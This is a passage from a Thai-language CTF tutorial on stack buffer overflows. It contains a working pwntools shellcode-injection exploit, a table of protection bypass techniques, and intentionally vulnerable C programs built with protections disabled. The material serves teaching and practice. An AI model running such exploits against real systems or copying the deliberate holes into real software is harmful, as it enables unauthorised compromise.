### 17.6 CTF Challenge: "Shellcode" (NX Disabled)

```bash
# checksec
$ checksec shellpwn
Stack:  No canary found
NX:     NX disabled        ← สามารถใช้ shellcode!
PIE:    No PIE

# Program prints buffer address! (common CTF pattern)
$ ./shellpwn
Buffer is at: 0x7fffffffee80
Enter shellcode: 
```

```python
#!/usr/bin/env python3
# solve_shellcode.py

from pwn import *

binary = './shellpwn'
elf = ELF(binary)
context.binary = elf

def solve():
    io = process(binary)

    # Program leaks buffer address
    io.recvuntil(b'Buffer is at: ')
    buf_addr = int(io.recvline().strip(), 16)
    log.info(f"Buffer @ {hex(buf_addr)}")

    # Shellcode
    shellcode = asm(shellcraft.sh())
    log.info(f"Shellcode: {len(shellcode)} bytes")

    # Offset
    offset = 64    # buffer size (ดูจาก disassembly)
    
    nop_sled = b'\x90' * 20

    payload = flat(
        nop_sled,
        shellcode,
        b'A' * (offset - len(nop_sled) - len(shellcode)),
        b'B' * 8,                      # saved rbp
        p64(buf_addr + 10)             # return → NOP sled
    )

    io.recvuntil(b'Enter shellcode: ')
    io.sendline(payload)

    io.interactive()

solve()
```

### 17.7 Tips สำหรับ CTF Pwn Challenges

**Checklist เมื่อเริ่ม challenge:**
1. `file <binary>` → ดู architecture, stripped/not
2. `checksec --file=<binary>` → ดู protections
3. `strings <binary>` → หา clues, function names, hints
4. `nm <binary>` → list symbols (ถ้า not stripped)
5. `ltrace <binary>` → trace library calls
6. `strace <binary>` → trace system calls
7. Run program ดู behavior
8. GDB/pwndbg analysis

**Common Vulnerabilities:**
- `gets()` → classic buffer overflow
- `read(0, buf, N)` กับ N > sizeof(buf) → overflow
- `scanf("%s", buf)` → no bounds check
- `strcpy(dst, src)` กับ src จาก user input

**Common Exploit Types (by protection level):**
- ไม่มี canary + ไม่มี NX + ไม่มี PIE → shellcode
- ไม่มี canary + มี NX + ไม่มี PIE → ret2win หรือ ret2libc
- มี canary + มี NX + ไม่มี PIE → leak canary → ret2libc
- มี canary + มี NX + มี PIE → leak canary + leak base → ROP

---

## 18. สรุป (Summary)

### 18.1 Key Concepts

**Stack Buffer Overflow เกิดเมื่อ:**
1. Program รับ input ลงใน buffer บน stack
2. ขนาด input มากกว่า buffer size
3. ข้อมูลส่วนเกิน overwrite memory ถัดไป (saved RBP, return address)
4. เมื่อ function return, RIP ถูก set เป็นค่าที่ attacker ต้องการ

**ลำดับขั้นตอนการ exploit:**
1. Identify vulnerability (source code review หรือ binary analysis)
2. Compile/analyze binary กับ security settings
3. หา offset ด้วย cyclic pattern technique
4. ยืนยัน offset ด้วย GDB
5. เลือก exploit technique ตาม protections
6. เขียน exploit script ด้วย pwntools
7. Test locally → Test remote

### 18.2 Protection Summary Table

| Protection    | gcc Flag                          | Bypass Technique                    |
|---------------|-----------------------------------|-------------------------------------|
| Stack Canary  | `-fstack-protector`               | Info leak, brute force (32-bit)     |
| NX/DEP        | (default on modern systems)       | ROP chains, ret2libc                |
| ASLR          | OS-level, `/proc/sys/kernel/...`  | Info leak, brute force (32-bit)     |
| PIE           | `-pie -fPIE`                      | Leak binary base address            |
| Full RELRO    | `-z relro -z now`                 | (protects GOT, use other vectors)   |

### 18.3 Learning Path

**ระดับ Beginner:**
- Basic stack overflow → ret2win
- Understanding memory layout
- Using GDB/pwndbg

**ระดับ Intermediate:**
- ret2libc (NX enabled)
- ROP chains
- Format string attacks
- Heap exploitation basics

**ระดับ Advanced:**
- Full ASLR + PIE bypass
- Heap exploitation (House of XXX)
- Kernel exploitation
- Browser exploitation

### 18.4 แหล่งเรียนรู้เพิ่มเติม

**Online Resources:**
- pwn.college → interactive learning platform
- exploit.education → vulnerable VMs
- ctf.pwn.cat → writeups
- picoCTF.org → beginner-friendly CTF
- pwnable.kr → progressive challenges
- ropemporium.com → ROP training

**Tools:**
- GDB + pwndbg: `github.com/pwndbg/pwndbg`
- pwntools: `github.com/Gallopsled/pwntools`
- checksec: `github.com/slimm609/checksec.sh`
- ROPgadget: `github.com/JonathanSalwan/ROPgadget`
- one_gadget: ใช้หา one-gadget RCE ใน libc

**Books:**
- "Hacking: The Art of Exploitation" by Jon Erickson
- "The Shellcoder's Handbook"
- "Computer Security: Art and Science" by Matt Bishop

### 18.5 Final Notes สำหรับ CTF Players

```
ข้อแนะนำ:
1. ฝึกใน VM หรือ CTF platform เท่านั้น
2. อย่า exploit ระบบจริงโดยไม่ได้รับอนุญาต
3. Share writeups หลัง CTF จบ เพื่อช่วยคนอื่น
4. เข้าร่วม community: CTFtime.org, r/securityCTF
5. ทำ CTF สม่ำเสมอ เพื่อรักษา skills
```

---

## Appendix A: Quick Reference

### A.1 Common Offset Formulas

```
32-bit:
offset = buffer_size + 4 (saved EBP)
→ RIP overwrite starts at: buffer_start + offset

64-bit:
offset = buffer_size + 8 (saved RBP)
→ RIP overwrite starts at: buffer_start + offset

Note: อาจมี alignment padding เพิ่มเติม → ใช้ cyclic pattern ยืนยัน
```

### A.2 pwntools Quick Cheatsheet

```python
from pwn import *

# Process
p = process('./binary')
p = remote('host', port)

# Send/Receive
p.sendline(payload)
p.recvuntil(b'prompt')
p.interactive()

# Pack addresses
p32(addr)    # 4 bytes little-endian
p64(addr)    # 8 bytes little-endian
u32(bytes)   # unpack 4 bytes
u64(bytes)   # unpack 8 bytes

# ELF
e = ELF('./binary')
e.symbols['function']
e.plt['libc_func']
e.got['libc_func']

# Cyclic
cyclic(n)              # generate n-byte pattern
cyclic_find(value)     # find offset from value

# Shellcode
asm(shellcraft.sh())   # /bin/sh shellcode

# Flat payload builder
flat(b'A'*64, p64(addr), ...)
```

### A.3 GDB/pwndbg Quick Reference

```bash
# Start
gdb -q ./binary
pwndbg> run [args]

# Breakpoints
b *address
b function_name
b *function+offset

# Navigation
c     # continue
si    # step instruction
ni    # next instruction
fin   # finish current function

# Examine
x/20gx $rsp    # 20 qwords at rsp
x/20wx $rbp    # 20 dwords at rbp
x/s address    # string at address
x/i $rip       # instruction at rip

# pwndbg specific
telescope $rsp 20   # enhanced stack view
vmmap               # memory mappings
checksec            # security features
cyclic 200          # generate cyclic pattern
cyclic -l value     # find offset
```

### A.4 Exploit Development Workflow

```
1. Recon
   file, checksec, strings, nm, ltrace

2. Static Analysis
   GDB disassembly, Ghidra/IDA decompilation

3. Dynamic Analysis
   Run with various inputs, observe behavior

4. Vulnerability Discovery
   Identify overflow, find vulnerable function

5. Offset Finding
   Cyclic pattern → crash → cyclic_find

6. Exploit Development
   Build payload → test locally → adjust

7. Remote Exploitation
   Test on CTF server, get flag
```

---

## Appendix B: Vulnerable Program Collection

### B.1 Level 1: Basic Overflow (ret2win)

```c
// level1.c
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[32];
    gets(buf);
}

int main() {
    vuln();
}
```

```bash
gcc level1.c -o level1 -fno-stack-protector -no-pie -g
```

### B.2 Level 2: Shellcode Injection

```c
// level2.c
#include <stdio.h>
#include <unistd.h>

void vuln() {
    char buf[64];
    printf("buf @ %p\n", buf);
    fflush(stdout);
    read(0, buf, 200);
}

int main() {
    vuln();
}
```

```bash
gcc level2.c -o level2 -fno-stack-protector -no-pie -z execstack -g
# Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### B.3 Level 3: Overwrite Variable

```c
// level3.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
    char buf[16];
    int auth = 0;
    
    printf("Password: ");
    gets(buf);
    
    if (auth == 0x1337) {
        system("/bin/sh");
    } else {
        printf("Wrong! auth=%d\n", auth);
    }
}
```

```bash
gcc level3.c -o level3 -fno-stack-protector -no-pie -g
# Exploit: overflow buf → overwrite auth with 0x1337
```

### B.4 Level 4: 32-bit Exploit

```c
// level4_32.c - same as level1 but 32-bit
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[32];
    gets(buf);
}

int main() {
    vuln();
}
```

```bash
gcc -m32 level4_32.c -o level4_32 -fno-stack-protector -no-pie -g
# offset = 32 (buf) + 4 (saved ebp) = 36
```

---

**จบ Part 071: Stack Buffer Overflow**

*เนื้อหาถัดไปใน Part 072 จะกล่าวถึง Return-Oriented Programming (ROP) ซึ่งเป็นเทคนิค exploit ที่ซับซ้อนกว่า เหมาะสำหรับ CTF challenges ที่มี NX enabled*
